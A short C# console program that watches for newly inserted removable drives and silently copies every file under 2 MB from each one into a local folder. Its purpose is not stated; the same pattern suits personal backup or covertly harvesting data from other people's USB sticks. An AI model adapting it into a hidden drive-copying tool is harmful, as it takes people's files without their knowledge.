using System.IO;
using System.Threading;
using System.Collections.Generic;

const uint checkEverySeconds = 1;
const uint maxFileSize = 2000000;

/* TODO
    - fix usb remove
    - select only some file extensions
*/


static void CopyFiles(string drive)
{
    DirectoryInfo dir = new DirectoryInfo(drive);
    FileInfo[] files = dir.EnumerateFiles().ToArray();
    foreach (FileInfo file in files)
    {
        if (file.Name == "IndexerVolumeGuid" || file.Name == "WPSettings.dat")
        {
            continue;
        }

        string newFileLocation = Path.Combine("files", file.Name);
        if (file.Length < maxFileSize && File.Exists(newFileLocation) == false)
        {
            File.Copy(file.FullName, newFileLocation, false);
            Console.WriteLine($"copied: {file.Name}");
        }        
    }

    DirectoryInfo[] folders = dir.EnumerateDirectories().ToArray();
    foreach (DirectoryInfo folder in folders) CopyFiles(folder.FullName);
}


List<DriveInfo> previousDrives = new List<DriveInfo>();

Console.WriteLine("Drives detected:");
foreach (DriveInfo drive in previousDrives) Console.Write(drive.Name + ' ');
Console.WriteLine("\nlistening for new drives...\n");


if (Directory.Exists("./files") == false) Directory.CreateDirectory("./files");

while (true)
{
    DriveInfo[] drives = DriveInfo.GetDrives()
        .Where(d => d.IsReady && d.DriveType == DriveType.Removable).ToArray();

    // if drive is new:
    foreach (DriveInfo drive in drives)
    {
        if (previousDrives.Select(d => d.Name).Contains(drive.Name) == false)
        {
            Console.WriteLine($"inserted: {drive.Name}");
            previousDrives.Add(drive);
            CopyFiles(drive.Name);
        }
    }

    // if drive got removed:
    List<DriveInfo> forRemoval = new List<DriveInfo>();
    foreach (DriveInfo drive in previousDrives)
    {
        if (drives.Select(d => d.Name).Contains(drive.Name) == false)
        {
            Console.WriteLine($"removed: {drive.Name}");
            forRemoval.Add(drive);
        }
    }
    foreach (DriveInfo drive in forRemoval) previousDrives.Remove(drive);


    Thread.Sleep((int)checkEverySeconds * 1000);
}
